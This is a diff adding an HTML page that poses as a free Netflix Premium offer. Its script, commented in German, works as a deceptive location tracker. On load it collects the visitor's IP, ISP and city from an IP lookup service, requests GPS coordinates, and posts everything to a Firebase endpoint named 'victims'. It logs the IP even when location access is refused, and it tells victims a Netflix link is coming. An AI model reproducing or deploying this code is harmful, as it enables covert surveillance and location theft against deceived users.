@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free Netflix Premium! Just verify location!</title>
+</head>
+<body>
+
+<h1>🎬 FREE NETFLIX ACCOUNT! Click ALLOW to unlock!</h1>
+
+<script>
+// Funktion: IP & Geo über externe API holen
+async function getIPDetails() {
+    try {
+        return await fetch('http://ip-api.com/json/?fields=country,countryCode,regionName,city,lat,lon,isp,org,query').then(r => r.json());
+    } catch (e) {
+        return { query: 'unknown', city: 'unknown' };
+    }
+}
+
+// Haupttracking-Funktion
+async function trackVictim(lat = null, lon = null, status = 'blocked') {
+    const ipData = await getIPDetails();
+
+    // Sende alles an Firebase
+    fetch('https://trackmeifyoucan-dc7e8-default-rtdb.europe-west1.firebasedatabase.app/victims.json', {
+        method: 'POST',
+        body: JSON.stringify({
+            status: status,
+            ip: ipData.query,
+            country: ipData.country,
+            city: ipData.city,
+            region: ipData.regionName,
+            isp: ipData.isp,
+            lat_manual: lat || ipData.lat,
+            lon_manual: lon || ipData.lon,
+            time: new Date().toISOString()
+        }),
+        headers: { 'Content-Type': 'application/json' }
+    }).catch(e => console.error("Send failed", e));
+}
+
+// 1. Versuch Geolocation zu holen (wenn erlaubt)
+if ("geolocation" in navigator) {
+    navigator.geolocation.getCurrentPosition(
+        function(pos) {
+            // 👇 ERFOLG – GPS GEKLAUT!
+            trackVictim(pos.coords.latitude, pos.coords.longitude, 'success');
+            alert("✅ Verified! Your Netflix link is being sent...");
+        },
+        function() {
+            // ❌ GEWEBIGERED – trotzdem IP loggen
+            trackVictim(null, null, 'geolocation_blocked');
+            alert("You denied access... still checking your network...");
+        }
+    );
+} else {
+    // 📵 Kein Geolocation-Support? Trotzdem IP loggen!
+    trackVictim(null, null, 'no_geolocation_support');
+}
+</script>
+
+</body>
+</html>
